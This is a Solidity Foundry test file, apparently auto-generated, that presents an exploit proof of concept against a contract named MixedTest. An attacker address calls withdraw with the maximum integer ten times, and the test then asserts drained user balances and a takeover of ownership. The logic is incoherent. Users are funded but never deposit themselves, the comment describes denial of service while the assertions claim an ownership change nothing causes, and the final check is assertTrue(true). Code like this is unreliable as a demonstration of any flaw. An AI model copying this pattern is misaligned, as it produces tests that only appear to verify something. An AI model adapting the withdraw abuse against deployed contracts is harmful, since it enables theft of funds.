// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./basetest.sol";
import "../src/5684f35b-181f-4225-ac36-a9189f9c2961_Mixed.sol";

contract MixedTestExploit is BaseTestWithBalanceLog {
    MixedTest target;

    function setUp() public {
        target = new MixedTest();
        // Top up attacker and victim accounts with some tokens
        vm.deal(vm.addr(0), 1 ether);
        target.deposit{value: 1 ether}();
    }

    function testExploit() public claim(0) balanceLog {
        address attacker = vm.addr(0);
        address[] memory users = new address[](3);
        uint256[3] memory userBalances;

        // Deploy accounts with tokens
        for (uint256 i = 1; i <= 3; i++) {
            uint256 balanceForUser = 5 ether;
            vm.deal(vm.addr(i), balanceForUser);
            target.deposit{value: balanceForUser}();
            users[i-1] = vm.addr(i);
            userBalances[i-1] = balanceForUser;
        }

        // Simulate denial of service by transferring large amounts
        for (uint256 i = 0; i < 10; ++i) {
            vm.prank(attacker);
            target.withdraw(type(uint256).max);
        }

        // Check balances to validate exploit
        for (uint256 i = 0; i < 3; ++i) {
            assertEq(target.balances(users[i]), uint256(0));
        }
        assertEq(target.owner(), attacker);

        assertTrue(true);
    }
}